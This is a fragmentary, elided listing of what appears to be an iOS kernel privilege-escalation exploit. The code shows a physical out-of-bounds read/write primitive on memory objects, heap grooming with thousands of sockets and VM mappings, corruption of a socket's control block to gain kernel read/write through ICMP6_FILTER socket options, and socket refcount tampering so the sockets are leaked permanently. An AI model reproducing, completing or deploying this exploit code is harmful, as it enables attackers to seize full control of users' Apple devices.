...
void setTargetKaddr(uint64_t where) {
    ...
    *(uint64_t *)controlData = where;
    int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER,
                         controlData, EARLY_KRW_LENGTH);
    if (res != 0) {
...
void sockets_release(NSMutableArray *socketPorts,
                     NSMutableArray *socketPcbIds) {
    while (socketPorts.lastObject) {
        mach_port_deallocate(
            mach_task_self(),
            ((NSNumber *)socketPorts.lastObject).unsignedIntValue);
...
kern_return_t physical_oob_read_mo(mach_port_t memoryObject,
    ...
    *(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;
    ...
    targetObject = 0;
    if (!readRaceSucceeded)
        return 1;
    return KERN_SUCCESS;
}

kern_return_t physical_oob_read_mo_with_retry(
    mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset,
    mach_vm_size_t size, mach_vm_offset_t offset, void *buffer) {
    kern_return_t kr;
    do {
        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size,
                                  offset, buffer);
    } while (kr != KERN_SUCCESS);
    return kr;
}

void physical_oob_write_mo(mach_port_t memoryObject,
                           mach_vm_offset_t memoryObjectOffset,
                           mach_vm_size_t size, mach_vm_offset_t offset,
                           void *buffer) {
    targetObject = memoryObject;
...
void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH]) {
    set_target_kaddr(where);
    int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf,
                         EARLY_KRW_LENGTH);
    if (res != 0) {
        printf("[-] setsockopt failed!!!");
        FAILURE(0);
...
int find_and_corrupt_socket(mach_port_t memoryObject,
                            mach_vm_offset_t seekingOffset, void *readBuffer,
                            void *writeBuffer,
                            NSMutableArray *targetInpGencntList, bool doRead) {
    if (doRead) {
        physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE,
    ...
    void *found = NULL;
    do {
        found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx,
    ...
    if (targetFound) {
        ...
        uint64_t targetInpGencnt =
            *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x78);
        ...
        for (int sockIdx = 0; sockIdx < socketPorts.count; sockIdx++) {
            if (socketPcbIds[sockIdx].unsignedLongLongValue ==
                targetInpGencnt) {
                isOurPcd = true;
        ...
        *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset +
        ...
        while (true) {
            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE,
                                  OOB_OFFSET, writeBuffer);
            physical_oob_read_mo_with_retry(memoryObject, seekingOffset,
        ...
        int sock = fileport_makefd(
            (fileport_t)socketPorts[controlSocketIdx].unsignedLongLongValue);
        socklen_t len = GETSOCKOPT_READ_LEN;
        int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER,
                             getsockoptReadData, &len);
        if (res != 0) {
            printf("[-] getsockopt failed!!!\n");
            FAILURE(0);
        }
        ...
        if (marker != -1) {
            ...
            controlSocket = sock;
            rwSocket =
                fileport_makefd((fileport_t)socketPorts[controlSocketIdx + 1]
...
void pe_v1(void) {
    uint64_t totalSearchMappingPagesNum =
        isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize =
        isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
    ...
    if (isA18Device) {
        kr = mach_vm_allocate(mach_task_self(), &wiredMapping, wiredMappingSize,
                              VM_FLAGS_ANYWHERE);
    ...
    while (true) {
        ...
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            ...
            kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress,
                                  searchMappingSize,
...
#define OPEN_MAX 10240
        ...
        int leeway = 4096 * 2;
        for (unsigned socketCount = 0; socketCount < (maxfiles - leeway);
             socketCount++) {
        ...
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress =
                searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress,
                                    searchMappingSize);
        }
        if (isA18Device) {
...
void krw_sockets_leak_forever(void) {
    ...
    uint64_t controlSocketSoCount =
        early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
    uint64_t rwSocketSoCount =
        early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
    early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT,
